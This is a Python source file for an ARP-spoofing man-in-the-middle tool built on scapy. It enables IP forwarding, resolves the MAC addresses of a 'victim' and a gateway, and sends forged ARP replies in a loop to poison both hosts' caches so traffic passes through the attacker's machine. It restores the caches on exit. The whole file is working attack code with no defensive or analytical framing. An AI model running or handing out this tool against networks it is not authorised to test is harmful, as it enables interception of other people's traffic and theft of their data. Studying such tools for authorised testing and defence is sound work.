#!/usr/bin/env python3
"""
 Copyright (c) 2017, Syslog777

 All rights reserved.

 Redistribution and use in source and binary forms, with or without modification,
 are permitted provided that the following conditions are met:

     * Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
     * Redistributions in binary form must reproduce the above copyright notice,
       this list of conditions and the following disclaimer in the documentation
       and/or other materials provided with the distribution.
     * Neither the name of Desktop nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.

 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""

from scapy.all import *

from mitm_core import mitm_input


# TODO: refactor to recieve unique module input args
class Mitm:

    def __init__(self):
        try:
            self.enable_forwarding()
            self.interface = mitm_input.get_interface()
            self.victim_ip = mitm_input.get_victimIP()
            self.gate_ip = mitm_input.get_gateIP()
            self.victim_mac = self.get_mac(self.victim_ip)
            self.gate_mac = self.get_mac(self.gate_ip)
        except KeyboardInterrupt:
            self.mitm_shutdown()

    def enable_forwarding(self):
        print("\n[*] Enabling IP forwarding....\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_forwarding(self):
        print("[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def mitm_shutdown(self):
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        self.disable_forwarding()
        sys.exit(1)

    def get_mac(self, ip):
        return scapy.layers.l2.getmacbyip(ip)

    def re_arp(self):
        try:
            print("\n[*] Restoring Targets...")
            victim_mac = self.get_mac(self.victim_ip)
            gate_mac = self.get_mac(self.gate_ip)
            sendp(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip,
                      hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
            sendp(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip,
                      hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
        except KeyboardInterrupt:
            self.mitm_shutdown()

    def trick(self, gm, vm):
        sendp(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip, hwdst=vm))
        sendp(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip, hwdst=gm))

    def connect(self, connection_attempts=1, pause_time=0.5):
        """
        connection_attempts: total number of attempts to trick the victim
        and the gate
        pause_time: time for mitm to wait before next connection attempt
        """
        try:
            self.victim_mac = self.get_mac(self.victim_ip)
        except Exception:
            print("[!] Couldn't Find Victim MAC Address")
            self.mitm_shutdown()
        try:
            self.gate_mac = self.get_mac(self.gate_ip)
        except Exception:
            print("[!] Couldn't Find Gateway MAC Address")
            self.mitm_shutdown()
        print("[*] Poisoning Targets...")
        count = connection_attempts
        while connection_attempts > 0:
            try:
                self.trick(self.gate_mac, self.victim_mac)
                connection_attempts = connection_attempts - 1
                time.sleep(pause_time)
            except KeyboardInterrupt:
                self.re_arp()
                break
        self.mitm_shutdown()

    def disconnect(self):
        self.re_arp()
